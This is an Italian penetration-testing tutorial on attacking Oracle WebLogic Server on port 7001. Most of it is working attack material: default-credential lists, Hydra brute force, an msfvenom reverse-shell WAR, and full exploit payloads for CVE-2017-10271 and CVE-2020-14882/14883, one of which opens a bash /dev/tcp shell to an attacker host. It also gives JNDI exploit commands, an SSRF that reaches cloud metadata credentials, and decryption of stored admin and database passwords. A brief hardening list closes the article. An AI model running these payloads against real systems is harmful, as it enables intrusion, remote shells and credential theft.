---
title: 'Porta 7001 WebLogic: T3, Console Admin e RCE'
slug: porta-7001-weblogic
description: 'Porta 7001 WebLogic nel pentest: T3 protocol, console admin, CVE RCE pre-auth, SSRF e accesso a Oracle WebLogic Server esposto.'
image: /porta-7001-weblogic .webp
draft: true
date: 2026-04-15T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - WebLogic RCE
  - Oracle WebLogic
  - T3 Protocol
---

Oracle WebLogic Server è un application server Java EE utilizzato da grandi enterprise per ospitare applicazioni web critiche: banking, ERP, portali governativi, sistemi di pagamento. Ascolta sulla porta 7001 TCP (HTTP/T3) e sulla [porta 7002](https://hackita.it/articoli/porta-7002-weblogic-ssl) (HTTPS/T3S). Nel penetration testing, WebLogic è probabilmente il software con il maggior numero di **Remote Code Execution pre-auth** della storia recente: deserializzazione Java non sicura, XXE, SSRF e path traversal si sono susseguiti anno dopo anno, con CVE critiche che vengono ancora sfruttate attivamente nel 2026 perché le aziende non patchano. Se trovi una porta 7001 aperta, hai un'alta probabilità di ottenere una shell — spesso come utente con privilegi elevati, perché WebLogic gira frequentemente come root o Administrator.

La porta 7001 è un multiplex: serve contemporaneamente traffico HTTP (la console di amministrazione e le applicazioni), il protocollo proprietario T3 (usato per la comunicazione tra nodi WebLogic) e IIOP (CORBA). I vettori di attacco principali passano per T3 e per la console web.

## Architettura WebLogic

```
Client                              WebLogic Server (:7001)
┌──────────────┐                   ┌──────────────────────────┐
│ Browser      │── HTTP ──────────►│ Console Admin            │
│              │                   │  /console                │
│              │── HTTP ──────────►│ Applicazioni deployate   │
│              │                   │  /app1, /app2            │
│              │                   │                          │
│ Java Client  │── T3 protocol ──►│ T3 Listener              │
│              │                   │  (deserializzazione!)    │
│              │── IIOP ─────────►│ IIOP Listener            │
│              │                   │  (deserializzazione!)    │
└──────────────┘                   └──────────────────────────┘
```

| Porta    | Protocollo       | Funzione                         |
| -------- | ---------------- | -------------------------------- |
| **7001** | HTTP + T3 + IIOP | Porta principale (tutto insieme) |
| 7002     | HTTPS + T3S      | Versione cifrata                 |
| 5556     | Node Manager     | Gestione nodi del dominio        |
| 9002     | T3 channel       | Porta alternativa T3             |

## 1. Enumerazione

### Nmap

```bash
nmap -sV -p 7001,7002,5556 10.10.10.40
```

```
PORT     STATE SERVICE    VERSION
7001/tcp open  http       Oracle WebLogic Server 14.1.1.0
7002/tcp open  ssl/http   Oracle WebLogic Server (SSL)
5556/tcp open  unknown
```

### Fingerprint versione

```bash
# La pagina di errore 404 rivela la versione
curl -s http://10.10.10.40:7001/ -I
```

```
HTTP/1.1 404 Not Found
Server: WebLogic Server
```

```bash
# Pagina di login della console
curl -s http://10.10.10.40:7001/console/ -I
```

```
HTTP/1.1 302 Found
Location: http://10.10.10.40:7001/console/login/LoginForm.jsp
```

Se redirect a `/console/login/LoginForm.jsp` → console admin raggiungibile.

```bash
# La pagina di login espone la versione esatta
curl -s http://10.10.10.40:7001/console/login/LoginForm.jsp | grep -i "version\|WebLogic"
```

### T3 protocol detection

```bash
nmap -p 7001 --script=weblogic-t3-info 10.10.10.40
```

```bash
# Test manuale T3
python3 -c "
import socket
s = socket.socket()
s.connect(('10.10.10.40', 7001))
s.send(b't3 12.2.1\nAS:255\nHL:19\nMS:10000000\n\n')
print(s.recv(1024).decode(errors='ignore'))
s.close()
"
```

```
HELO:12.2.1.4.0.false
```

T3 attivo, versione `12.2.1.4.0` confermata.

### Directory bruteforce

```bash
# Path noti di WebLogic
gobuster dir -u http://10.10.10.40:7001 -w /usr/share/wordlists/dirb/common.txt -t 20
```

Path comuni da testare manualmente:

```bash
# Console admin
curl -s http://10.10.10.40:7001/console/
# UDDI explorer (spesso non protetto)
curl -s http://10.10.10.40:7001/uddiexplorer/
# WLS-WSAT (vulnerabile a CVE-2017-10271)
curl -s http://10.10.10.40:7001/wls-wsat/CoordinatorPortType
# Bea utils
curl -s http://10.10.10.40:7001/_async/AsyncResponseService
```

## 2. Credential Attack — Console Admin

### Default credentials

| Username   | Password     | Note                     |
| ---------- | ------------ | ------------------------ |
| `weblogic` | `weblogic`   | Default più comune       |
| `weblogic` | `welcome1`   | Oracle installer default |
| `weblogic` | `weblogic1`  | Variante                 |
| `weblogic` | `Oracle@123` | Setup Oracle             |
| `system`   | `password`   | Legacy                   |
| `operator` | `password`   | Account operatore        |

```bash
# Test manuale
curl -s -X POST http://10.10.10.40:7001/console/j_security_check \
  -d "j_username=weblogic&j_password=welcome1" -v 2>&1 | grep -i "location\|set-cookie"
```

Se redirect a `/console/console.portal` → login riuscito.

### Brute force

```bash
# Hydra
hydra -l weblogic -P /usr/share/wordlists/rockyou.txt 10.10.10.40 http-post-form \
  "/console/j_security_check:j_username=^USER^&j_password=^PASS^:j_security_check" -s 7001
```

### Post-auth console — Deploy webshell

Con accesso alla console admin:

```
1. Login → Deployments → Install
2. Upload un WAR file (webshell)
3. Deploy come applicazione
4. Accedi alla webshell via browser
```

```bash
# Genera un WAR con msfvenom
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.200 LPORT=4444 -f war -o shell.war
```

Deploy `shell.war` dalla console → accedi a `http://10.10.10.40:7001/shell/` → reverse shell.

## 3. CVE — L'Arsenale di RCE Pre-Auth

WebLogic ha una storia di CVE critiche che è quasi imbarazzante. Ecco le più importanti, tutte con exploit pubblici funzionanti.

### CVE-2017-10271 — XMLDecoder RCE (CVSS 9.8)

RCE pre-auth tramite deserializzazione XML nel componente WLS-WSAT. Una delle CVE più sfruttate di sempre.

```bash
# Verifica se il path vulnerabile esiste
curl -s http://10.10.10.40:7001/wls-wsat/CoordinatorPortType
```

Se risponde con WSDL XML → probabilmente vulnerabile.

```bash
# Exploit: invia XML malevolo
curl -s http://10.10.10.40:7001/wls-wsat/CoordinatorPortType \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java version="1.8" class="java.beans.XMLDecoder">
        <void class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/bash</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>bash -i &gt;&amp; /dev/tcp/10.10.10.200/4444 0&gt;&amp;1</string></void>
          </array>
          <void method="start"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>'
```

```bash
# Con Metasploit
use exploit/multi/http/oracle_weblogic_wsat_deserialization_rce
set RHOSTS 10.10.10.40
set LHOST 10.10.10.200
run
```

### CVE-2019-2725 — AsyncResponseService RCE (CVSS 9.8)

Bypass della patch di CVE-2017-10271 tramite il componente `_async`.

```bash
# Verifica
curl -s http://10.10.10.40:7001/_async/AsyncResponseService
```

```bash
# Exploit — stesso payload XML della CVE-2017-10271 ma su path diverso
curl -s http://10.10.10.40:7001/_async/AsyncResponseService \
  -H "Content-Type: text/xml" \
  -d '... stesso XML payload ...'
```

### CVE-2020-14882 + CVE-2020-14883 — Console RCE (CVSS 9.8)

La combo più devastante: bypass dell'autenticazione della console (14882) + RCE (14883).

```bash
# Bypass autenticazione console — accedi senza password
curl -s "http://10.10.10.40:7001/console/css/%252e%252e%252fconsole.portal" -I
```

Se risponde `200 OK` con contenuto della console → bypass funzionante.

```bash
# RCE via handle resource (CVE-2020-14883)
curl -s "http://10.10.10.40:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField(\"connectionHandler\"); field.setAccessible(true); Object obj = field.get(adapter); weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(\"getServletRequest\").invoke(obj); String cmd = req.getHeader(\"cmd\"); String[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]{\"cmd.exe\", \"/c\", cmd} : new String[]{\"/bin/sh\", \"-c\", cmd}; if(cmd != null){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(\"\\\\A\").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(\"getResponse\").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();')"  -H "cmd: id"
```

Più semplicemente con uno script Python dedicato o Metasploit:

```bash
use exploit/multi/http/weblogic_admin_handle_rce
set RHOSTS 10.10.10.40
set LHOST 10.10.10.200
run
```

### CVE-2023-21839 — IIOP/T3 RCE

Remote Code Execution tramite il protocollo IIOP/T3 — pre-auth:

```bash
# Tool dedicato
java -jar CVE-2023-21839.jar -ip 10.10.10.40 -port 7001 -ldap ldap://10.10.10.200:1389/exploit
```

Richiede un LDAP/RMI server malevolo (JNDI injection):

```bash
# Avvia JNDI exploit server
java -jar JNDIExploit.jar -i 10.10.10.200
```

### CVE-2023-22069 / CVE-2024-20931 — T3/IIOP Chain

Continuazione della catena di deserializzazione. Ogni patch Oracle viene bypassata entro mesi.

### Tabella riassuntiva CVE

| CVE            | Anno | Vettore                   | Auth | CVSS | Versioni                   |
| -------------- | ---- | ------------------------- | ---- | ---- | -------------------------- |
| CVE-2017-3506  | 2017 | WLS-WSAT XML              | No   | 9.8  | 10.3.6, 12.x               |
| CVE-2017-10271 | 2017 | WLS-WSAT XMLDecoder       | No   | 9.8  | 10.3.6, 12.x               |
| CVE-2018-2628  | 2018 | T3 deserializzazione      | No   | 9.8  | 10.3.6, 12.x               |
| CVE-2019-2725  | 2019 | \_async XMLDecoder        | No   | 9.8  | 10.3.6, 12.1.3             |
| CVE-2020-2551  | 2020 | IIOP deserializzazione    | No   | 9.8  | 10.3.6, 12.x, 14.x         |
| CVE-2020-14882 | 2020 | Console auth bypass       | No   | 9.8  | 10.3.6, 12.x, 14.x         |
| CVE-2020-14883 | 2020 | Console RCE (post bypass) | No\* | 9.8  | 10.3.6, 12.x, 14.x         |
| CVE-2023-21839 | 2023 | T3/IIOP JNDI              | No   | 7.5  | 12.2.1.3, 12.2.1.4, 14.1.1 |
| CVE-2024-20931 | 2024 | T3/IIOP bypass            | No   | 7.5  | 12.2.1.4, 14.1.1           |

### Scansione automatica con nuclei

```bash
nuclei -u http://10.10.10.40:7001 -t cves/2017/ -t cves/2019/ -t cves/2020/ -t cves/2023/ -tags weblogic
```

## 4. SSRF — Server-Side Request Forgery

### UDDI Explorer SSRF

```bash
# Testa SSRF via UDDI
curl -s "http://10.10.10.40:7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://10.10.10.200:8888/ssrf_test&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search"
```

Se il tuo listener sulla porta 8888 riceve una connessione → SSRF confermata. Usa per:

```bash
# Scansiona porte interne via SSRF
for port in 22 80 3306 6379 8080 9200; do
    curl -s "http://10.10.10.40:7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://127.0.0.1:$port/&rdoSearch=name&txtSearchname=a&btnSubmit=Search" | grep -c "error" && echo "Port $port: response"
done
```

```bash
# Accedi a servizi interni
curl -s "http://10.10.10.40:7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://169.254.169.254/latest/meta-data/iam/security-credentials/&rdoSearch=name&txtSearchname=a&btnSubmit=Search"
```

SSRF verso il metadata service cloud → [AWS credential theft](https://hackita.it/articoli/aws-privilege-escalation).

## 5. Post-Exploitation

### Credenziali dal filesystem WebLogic

```bash
# Il file più importante: contiene la password admin criptata
cat /u01/oracle/user_projects/domains/base_domain/security/boot.properties
```

```
username=weblogic
password={AES}abc123def456...
```

```bash
# Decrypt con tool dedicato
python3 weblogic_decrypt.py /u01/oracle/.../SerializedSystemIni.dat "{AES}abc123def456..."
```

```bash
# Cerca altri file sensibili
find / -name "boot.properties" -o -name "config.xml" -o -name "jps-config.xml" 2>/dev/null
```

Il file `config.xml` contiene credenziali per datasource JDBC ([database](https://hackita.it/articoli/porta-3306-mysql)), LDAP, JMS e altri servizi — tutte criptate con lo stesso meccanismo, tutte decriptabili con `SerializedSystemIni.dat`.

### Datasource credentials

```bash
# Nel config.xml
grep -A5 "jdbc-driver-params" /u01/oracle/.../config/config.xml
```

```xml
<jdbc-driver-params>
  <url>jdbc:oracle:thin:@db-prod.corp.internal:1521:ORCL</url>
  <properties><property><name>user</name><value>app_user</value></property></properties>
  <password-encrypted>{AES}encrypted_password_here</password-encrypted>
</jdbc-driver-params>
```

Credenziali per [Oracle DB](https://hackita.it/articoli/porta-2483-oracle-db) di produzione.

## 6. Detection & Hardening

* **Patch regolari** — Oracle rilascia CPU (Critical Patch Update) ogni trimestre, applicale
* **Rimuovi WLS-WSAT e \_async** se non utilizzati: cancella i WAR da `$WL_HOME/server/lib/`
* **Disabilita T3 per connessioni esterne** — usa solo HTTP/HTTPS
* **Disabilita IIOP** se non necessario
* **Credenziali console forti** — non `weblogic:welcome1`
* **Non esporre la console su Internet** — filtra `/console/` e `/uddiexplorer/`
* **Firewall** — porta 7001 solo dalla rete applicativa, console solo da management
* **WAF** — regole per bloccare payload XMLDecoder e deserializzazione
* **Esegui come utente non-root** con privilegi minimi
* **Monitora** tentativi su path noti: `/wls-wsat/`, `/_async/`, `/console/css/%252e`

## 7. Cheat Sheet Finale

| Azione         | Comando                                                                                     |
| -------------- | ------------------------------------------------------------------------------------------- |
| Nmap           | `nmap -sV -p 7001,7002,5556 target`                                                         |
| Console        | `curl -s http://target:7001/console/`                                                       |
| Versione       | `curl -s http://target:7001/console/login/LoginForm.jsp \| grep version`                    |
| T3 test        | Invia `t3 12.2.1\n` su socket TCP                                                           |
| WLS-WSAT       | `curl -s http://target:7001/wls-wsat/CoordinatorPortType`                                   |
| \_async        | `curl -s http://target:7001/_async/AsyncResponseService`                                    |
| Default creds  | `weblogic:welcome1`, `weblogic:weblogic1`                                                   |
| CVE-2017-10271 | XMLDecoder payload su /wls-wsat/                                                            |
| CVE-2020-14882 | `curl http://target:7001/console/css/%252e%252e%252fconsole.portal`                         |
| SSRF UDDI      | `curl http://target:7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://INTERNAL/` |
| Nuclei         | `nuclei -u http://target:7001 -tags weblogic`                                               |
| Decrypt pwd    | `python3 weblogic_decrypt.py SerializedSystemIni.dat "{AES}..."`                            |
| Searchsploit   | `searchsploit weblogic`                                                                     |

***

Riferimento: Oracle WebLogic Security advisories, HackTricks WebLogic, OSCP/OSED methodology. Uso esclusivo in ambienti autorizzati. [https://www.pentestpad.com/port-exploit/port-7001-weblogic-oracle-weblogic-server](https://www.pentestpad.com/port-exploit/port-7001-weblogic-oracle-weblogic-server)

> Vuoi proteggere la tua infrastruttura enterprise? Il [penetration test HackIta](https://hackita.it/servizi) individua le vulnerabilità prima che lo facciano altri. Per chi vuole imparare: [formazione personalizzata 1:1](https://hackita.it/formazione).
